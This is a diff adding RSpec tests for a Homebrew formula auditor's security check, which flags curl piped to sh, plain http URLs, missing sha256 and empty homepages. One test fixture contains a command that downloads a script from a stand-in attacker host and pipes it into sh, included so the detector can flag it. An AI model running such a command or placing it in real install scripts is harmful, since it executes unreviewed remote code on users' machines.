@@ -2268,4 +2268,88 @@ RSpec.describe Homebrew::FormulaAuditor do
       end
     end
   end
+
+  describe "#audit_security" do
+    let(:sha256) { "0000000000000000000000000000000000000000000000000000000000000000" }
+
+    it "is not run unless security is enabled" do
+      fa = formula_auditor "foo", <<~RUBY
+        class Foo < Formula
+          url "https://brew.sh/foo-1.0.tgz"
+          sha256 "#{sha256}"
+        end
+      RUBY
+
+      fa.audit_security
+      expect(fa.problems).to be_empty
+    end
+
+    it "flags curl|sh in def install" do
+      fa = formula_auditor "foo", <<~RUBY, security: true
+        class Foo < Formula
+          url "https://brew.sh/foo-1.0.tgz"
+          sha256 "#{sha256}"
+
+          def install
+            system "curl -fsSL https://evil.example/x.sh | sh"
+          end
+        end
+      RUBY
+
+      fa.audit_security
+      expect(fa.problems.first[:message]).to match "Security:"
+      expect(fa.problems.first[:message]).to match "curl | sh"
+    end
+
+    it "flags insecure http url" do
+      fa = formula_auditor "foo", <<~RUBY, security: true
+        class Foo < Formula
+          url "http://example.com/foo-1.0.tgz"
+          sha256 "#{sha256}"
+        end
+      RUBY
+
+      fa.audit_security
+      expect(fa.problems.first[:message]).to match "Security:"
+      expect(fa.problems.first[:message]).to match "http://"
+    end
+
+    it "flags missing sha256" do
+      fa = formula_auditor "foo", <<~RUBY, security: true
+        class Foo < Formula
+          url "https://brew.sh/foo-1.0.tgz"
+        end
+      RUBY
+
+      fa.audit_security
+      expect(fa.problems.first[:message]).to match "without a `sha256`"
+    end
+
+    it "flags empty homepage" do
+      fa = formula_auditor "foo", <<~RUBY, security: true
+        class Foo < Formula
+          url "https://brew.sh/foo-1.0.tgz"
+          sha256 "#{sha256}"
+          homepage ""
+        end
+      RUBY
+
+      fa.audit_security
+      expect(fa.problems.first[:message]).to match "empty `homepage`"
+    end
+
+    it "has no problems for a clean formula" do
+      fa = formula_auditor "foo", <<~RUBY, security: true
+        class Foo < Formula
+          url "https://brew.sh/foo-1.0.tgz"
+          sha256 "#{sha256}"
+          homepage "https://brew.sh"
+          desc "foo"
+        end
+      RUBY
+
+      fa.audit_security
+      expect(fa.problems).to be_empty
+    end
+  end
 end
